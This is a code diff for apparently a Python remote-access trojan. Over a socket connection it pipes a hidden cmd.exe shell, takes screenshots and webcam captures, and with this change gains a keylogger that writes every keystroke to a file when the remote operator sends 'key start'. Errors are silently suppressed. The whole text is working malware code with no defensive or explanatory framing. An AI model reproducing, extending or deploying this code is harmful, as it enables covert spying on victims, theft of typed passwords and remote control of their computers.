@@ -1,9 +1,26 @@
-import socket,subprocess,threading,pygame,pyscreenshot,datetime,re
-import pygame.camera
+import socket,subprocess,threading,pygame,pyscreenshot,datetime,re,pygame.camera
+from pynput.keyboard import Listener
 
 def send_data_to_process(process,data):
     process.stdin.write(data)
     process.stdin.flush()
+
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.shift_r':
+        key = ''
+    if key == "Key.enter":
+        key = '\n'
+
+    with open("log.txt", 'a') as f:
+        f.write(key)
+
+def keylogger():
+    with Listener(on_press=log_keystroke) as l:
+        l.join()
 
 def screenshot():
     image = pyscreenshot.grab()
@@ -22,8 +39,10 @@ def cam_capture(cam_id):
     return filename
 
 def receive_data(s, p):
+    try:
         pygame.init()
         pygame.camera.init()
+        keylogger_thread = threading.Thread(target=keylogger,daemon=True)
         while 1:
             data = s.recv(1024)
             if len(data) > 0:
@@ -45,8 +64,19 @@ def receive_data(s, p):
                         send_data_to_process(p,("image saved"+filename+"\n").encode())
                     else:
                         send_data_to_process(p,"No cam with this id\n".encode())
+                elif data.decode() == "key start\n": #Start the keylogger
+                    if not keylogger_thread.is_alive():
+                        keylogger_thread.start()
+                        send_data_to_process(p,"Keylogger started\n".encode())
+                    else:
+                        send_data_to_process(p,"Keylogger is already running\n".encode())
+                elif data.decode() == "key stop\n": #Stop the keylogger
+                    keylogger_thread.join(1)
+                    send_data_to_process(p,"Keylogger is stopped\n".encode())
                 else:
                     send_data_to_process(p,data)
+    except:
+        pass
 
 def send_data(s, p):
     try:
@@ -58,12 +88,10 @@ def send_data(s, p):
 
 def launching_process(ip,port,s):
     p=subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-    receive_thread = threading.Thread(target=receive_data, args=[s, p])
-    receive_thread.daemon = True
+    receive_thread = threading.Thread(target=receive_data, args=[s, p],daemon=True)
     receive_thread.start()
 
-    send_thread = threading.Thread(target=send_data, args=[s, p])
-    send_thread.daemon = True
+    send_thread = threading.Thread(target=send_data, args=[s, p],daemon=True)
     send_thread.start()
 
     p.wait()
